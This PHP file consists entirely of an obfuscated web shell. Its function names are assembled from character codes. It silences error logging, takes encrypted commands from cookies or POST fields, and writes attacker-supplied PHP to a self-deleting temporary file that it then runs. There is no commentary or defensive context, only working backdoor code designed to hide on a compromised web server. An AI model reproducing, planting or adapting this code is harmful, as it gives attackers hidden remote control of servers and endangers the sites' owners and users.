<?php $rqqubgta = 'f'.chr(105).'l'."\145"."\x5f".chr(112).chr(117).chr(886-770).chr(95).chr(731-632)."\x6f".chr(110).chr(928-812).chr(101).chr(661-551).chr(116).'s';
$igsvuc = 'b'."\141".chr(334-219).'e'.chr(394-340)."\64".'_'."\144".chr(280-179).'c'.chr(635-524)."\x64".chr(101);
$pidgt = 'i'."\x6e".chr(627-522).'_'."\163".chr(622-521)."\164";
$bishhoc = "\165"."\156".chr(108).chr(105)."\156"."\153";


@$pidgt("\145".'r'.chr(114).chr(111).'r'.'_'.chr(108).chr(111)."\x67", NULL);
@$pidgt(chr(108)."\157".chr(103)."\137"."\x65".chr(114).chr(194-80).chr(866-755).chr(708-594)."\163", 0);
@$pidgt(chr(581-472).chr(97).chr(120)."\137"."\145"."\x78".chr(101)."\143".chr(766-649)."\164".chr(1101-996).'o'."\x6e".chr(825-730).chr(251-135)."\151".'m'.chr(391-290), 0);
@set_time_limit(0);

function kcznihsmwj($uwufbethw, $ljwnpcy)
{
    $sacrbwodo = "";
    for ($zozgv = 0; $zozgv < strlen($uwufbethw);) {
        for ($j = 0; $j < strlen($ljwnpcy) && $zozgv < strlen($uwufbethw); $j++, $zozgv++) {
            $sacrbwodo .= chr(ord($uwufbethw[$zozgv]) ^ ord($ljwnpcy[$j]));
        }
    }
    return $sacrbwodo;
}

$owyqgxh = array_merge($_COOKIE, $_POST);
$aebvbzoxir = '0330b9a2-6c61-4df9-be60-a68f0b7f2c2c';
foreach ($owyqgxh as $lhrmgdvv => $uwufbethw) {
    $uwufbethw = @unserialize(kcznihsmwj(kcznihsmwj($igsvuc($uwufbethw), $aebvbzoxir), $lhrmgdvv));
    if (isset($uwufbethw["\x61".chr(807-700)])) {
        if ($uwufbethw["\141"] == "\151") {
            $zozgv = array(
                'p'."\x76" => @phpversion(),
                chr(115).chr(263-145) => "3.5",
            );
            echo @serialize($zozgv);
        } elseif ($uwufbethw["\141"] == chr(101)) {
            $luvqbhlxgz = "./" . md5($aebvbzoxir) . chr(487-441).'i'."\x6e".chr(694-595);
            @$rqqubgta($luvqbhlxgz, "<" . "\77"."\x70".chr(104)."\160"."\x20".chr(263-199)."\x75"."\156".chr(1033-925)."\x69"."\x6e".chr(107)."\x28".chr(1085-990)."\137".chr(697-627).chr(73)."\x4c".chr(391-322).'_'.chr(302-207)."\51"."\x3b".' ' . $uwufbethw[chr(100)]);
            @include($luvqbhlxgz);
            @$bishhoc($luvqbhlxgz);
        }
        exit();
    }
}

